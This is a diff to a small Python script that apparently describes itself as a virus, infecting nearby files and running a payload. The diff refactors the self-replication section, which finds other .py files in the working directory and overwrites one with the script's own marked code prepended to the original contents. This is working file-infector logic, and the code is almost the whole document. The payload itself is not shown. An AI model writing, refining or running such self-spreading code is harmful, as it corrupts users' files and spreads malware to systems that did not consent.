@@ -11,15 +11,12 @@ infecting nearby files and executing a specific payload.
 ### REPLICATION START ###
 # Self-Replication Section
 import os, glob
-
 selfname = os.path.basename(__file__)
 
 targets = glob.glob('*.py')
 targets.remove(selfname)
-
 with open(targets[0], 'r') as tr:
     target_data = tr.readlines()
-
 twrite = open(targets[0], 'w')
 
 f = open(selfname, 'r')
@@ -28,12 +25,8 @@ selffile = f.readlines()
 index_start = selffile.index('### REPLICATION START ###\n')
 index_end = selffile.index('### REPLICATION END ###\n') + 1
 viral_content = selffile[index_start:index_end]
-
 viral_content.append('\n')
-
-for x in target_data:
-    viral_content.append(x)
-
+viral_content.extend(target_data)
 for line in viral_content:
     twrite.write(line)
 
